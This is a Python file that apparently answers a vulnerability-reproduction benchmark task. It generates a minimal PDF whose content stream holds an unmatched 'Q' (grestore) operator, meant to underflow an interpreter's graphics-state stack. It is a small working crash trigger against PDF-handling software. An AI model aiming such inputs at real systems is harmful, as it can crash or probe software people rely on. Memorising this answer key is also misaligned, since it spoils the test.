class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        
        # This PoC creates a minimal PDF file that causes a graphics state
        # stack underflow. The vulnerability description points to a missing
        # check before a "viewer state restore" operation. In PDF/PostScript,
        # this corresponds to the 'Q' (grestore) operator. By placing a 'Q'
        # in a page's content stream without a preceding 'q' (gsave), we
        # force the interpreter to pop from an empty stack, triggering the bug.

        objects = []
        
        # Object 1: Document Catalog
        objects.append(b"<< /Type /Catalog /Pages 2 0 R >>")

        # Object 2: Page Tree
        objects.append(b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>")

        # Object 3: Page Object
        objects.append(b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] /Contents 4 0 R >>")

        # Object 4: Content Stream containing the trigger 'Q'
        stream_content = b"Q"
        stream_dict = b"<< /Length %d >>" % len(stream_content)
        content_stream = stream_dict + b"\r\nstream\r\n" + stream_content + b"\r\nendstream"
        objects.append(content_stream)

        # Assemble the PDF file
        pdf_parts = [b"%PDF-1.4\r\n"]
        
        xref_offsets = []
        current_offset = len(pdf_parts[0])

        for i, obj_content in enumerate(objects):
            xref_offsets.append(current_offset)
            
            obj_header = b"%d 0 obj\r\n" % (i + 1)
            obj_footer = b"\r\nendobj\r\n"
            
            pdf_parts.append(obj_header)
            pdf_parts.append(obj_content)
            pdf_parts.append(obj_footer)
            
            current_offset += len(obj_header) + len(obj_content) + len(obj_footer)

        xref_start_offset = current_offset
        
        # Cross-reference (xref) table
        num_xref_entries = len(objects) + 1
        
        xref_table_parts = [
            b"xref\r\n",
            b"0 %d\r\n" % num_xref_entries,
            b"0000000000 65535 f \r\n"
        ]
        
        for offset in xref_offsets:
            xref_table_parts.append(b"%010d 00000 n \r\n" % offset)
        
        pdf_parts.extend(xref_table_parts)
        
        # Trailer
        trailer_parts = [
            b"trailer\r\n",
            b"<< /Size %d /Root 1 0 R >>\r\n" % num_xref_entries,
            b"startxref\r\n",
            b"%d\r\n" % xref_start_offset,
            b"%%EOF"
        ]
        
        pdf_parts.extend(trailer_parts)
        
        return b"".join(pdf_parts)
